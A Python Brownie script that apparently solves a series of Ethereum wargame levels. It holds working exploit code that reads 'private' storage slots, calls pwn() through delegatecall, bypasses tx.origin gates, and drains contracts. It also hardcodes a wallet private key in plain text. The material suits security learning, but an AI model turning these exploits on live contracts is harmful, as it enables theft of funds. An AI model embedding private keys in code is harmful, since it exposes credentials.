from brownie import accounts, network, chain, web3, Atk_Telephone, Telephone, Delegation, Token, GatekeeperOne, Atk_Gate1, \
    Fallback, Vault, Privacy, GatekeeperTwo, Atk_Gate2, NaughtCoin, Atk_Naughtcoin

# 0x833514593c7798551A20Ac69f98D486e2A12dFe8
wallet: network.account.LocalAccount = accounts.add("0x3662a22892fc295c76adb33fc89ee7c8e1cdf769d7e059d28d0bed0d659eeaf9")


# accounts.default = wallet


def main():
    # telephone()
    # delegation("")
    # gateKeeper1("")
    # fallback("")
    # vault("")
    # privacy("")
    # gateKeeper2("")
    # naughtcoin("")

    pass


def _slot_to_addr(num):
    return f"0x{num:064x}"


def _get_next_addr(addr, element_bit, n_bit):
    n_bit = n_bit if (n_bit := n_bit + element_bit) <= 256 else False
    if n_bit is False:
        addr = _slot_to_addr(int(addr, 16) + 1)
        n_bit = element_bit
    return addr, n_bit


def telephone(addr):
    Telephone.at(addr)
    tele = Telephone[-1]
    Atk_Telephone.deploy(tele, {"from": accounts[0]})
    atk = Atk_Telephone[-1]
    atk.atk({"from": wallet, "gas_limit": 1000000})


def fallback(addr):
    fb = Fallback.at(addr)
    fb.contribute({"from": wallet, "value": 100000, "priority_fee": "5 gwei"})
    wallet.transfer(fb, 100000, priority_fee="5 gwei")
    fb.withdraw({"from": wallet, "priority_fee": "5 gwei"})


def delegation(addr):
    pwn = web3.keccak(text="pwn()").hex()
    # fallback() not payable => send 0 wei
    wallet.transfer(addr, amount=0, data=pwn, gas_limit=1000000, priority_fee="2 gwei")


def vault(vault_addr):
    key_addr = _slot_to_addr(1)
    key = web3.eth.get_storage_at(vault_addr, key_addr).hex()
    # key_bytes = bytes.fromhex(key[2:])
    v = Vault.at(vault_addr)
    v.unlock(key, {"from": wallet, "gas": 100000, "priority_fee": "2 gwei"})


def privacy(addr):
    p = Privacy.at(addr)
    data_addr = _slot_to_addr(5)
    data = web3.eth.get_storage_at(addr, data_addr).hex()
    data_16bytes_hex = data[:-32]
    data_16bytes = bytes.fromhex(data_16bytes_hex[2:])  # s5_value = s5_bytes.hex()
    p.unlock(data_16bytes, {"from": wallet, "gas": 100000, "priority_fee": "5 gwei"})


def token(addr):
    accounts.add()
    receiver = accounts[1]
    token = Token.at(addr)
    token.transfer(receiver.address, 21, {"from": wallet})
    print(token.balanceOf(wallet))


def gateKeeper1(gate_addr):
    # uint16(uint160(tx.origin))
    uint16_wallet = wallet.address[-4:]
    # uint32(uint64(Key)) = uint16_wallet
    uint32_key = uint16_wallet.zfill(8)
    # uint64(Key) != uint32_key
    uint64_key = ("1" + uint32_key).zfill(16)

    gate1 = GatekeeperOne.at(gate_addr)
    atk = Atk_Gate1.deploy(gate1, {"from": wallet})

    atk.enter(uint64_key, {"from": wallet, "gas": 10000000, "priority_fee": "5 gwei"})
    print(gate1.entrant())


def gateKeeper2(gate_addr):
    Atk_Gate2.deploy(gate_addr, {"from": wallet, "gas": 100000, "priority_fee": "5 gwei"})


def naughtcoin(addr):
    n = NaughtCoin.at(addr)
    receiver = Atk_Naughtcoin.deploy(addr, {"from": wallet, "priority_fee": "5 gwei"})
    balance = n.balanceOf(wallet)
    n.approve(receiver, balance, {"from": wallet, "gas": 100000, "priority_fee": "5 gwei"})
    receiver.withdraw({"from": wallet, "gas": 100000, "priority_fee": "5 gwei"})
